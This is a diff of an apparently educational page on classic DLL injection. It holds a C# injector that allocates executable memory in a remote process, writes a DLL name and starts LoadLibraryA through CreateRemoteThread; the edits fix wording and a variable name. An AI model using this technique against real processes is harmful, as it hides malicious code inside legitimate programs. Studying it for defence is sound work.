@@ -15,10 +15,10 @@ description: Inject DLLs into remote process's virtual address space
 
 A simple C# DLL injector to explain the basics:
 
-1. Allocate space for the malicious DLL in remote process's virtual address space.
-2. Write the DLL contents into the allocated space.
+1. Allocate space for the malicious DLL name in remote process's virtual address space.
+2. Write the DLL name into the allocated space.
 3. Locate the address of the [LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function in kernel32.dll with `GetModuleHandle` and `GetProcAddress`. Most Windows native DLLs are allocated at the same base address, so the obtained address of `LoadLibraryA` will be the same for the remote process.
-4. Invoke `LoadLibraryA` function on the behalf of the remote thread supplying base `LoadLibraryA` address as the *4th* argument of `CreateRemoteThread` and the name of the DLL to be loaded as the *5th* argument.
+4. Invoke `LoadLibraryA` function on the behalf of the remote thread supplying base `LoadLibraryA` address as the *4th* argument of `CreateRemoteThread` and the address of the DLL name to be loaded as the *5th* argument.
 
 All this is needed because `LoadLibrary` functions cannot be invoked natively on a remote process.
 
@@ -68,15 +68,15 @@ namespace DLLInjector
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
 
             // Allocate space for the DLL name in remote process's virtual address space and write it
-            IntPtr dllAddress = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr dllNameAddress = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             IntPtr outSize;
-            WriteProcessMemory(hProcess, dllAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+            WriteProcessMemory(hProcess, dllNameAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
 
             // Locate base address of the LoadLibraryA function in kernel32.dll (this address will be the same for the remote process)
             IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
 
             // Invoke LoadLibraryA function in the remote process supplying starting address of the malicious DLL in its (process's) address space
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, dllAddress, 0, IntPtr.Zero);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, dllNameAddress, 0, IntPtr.Zero);
         }
     }
 }
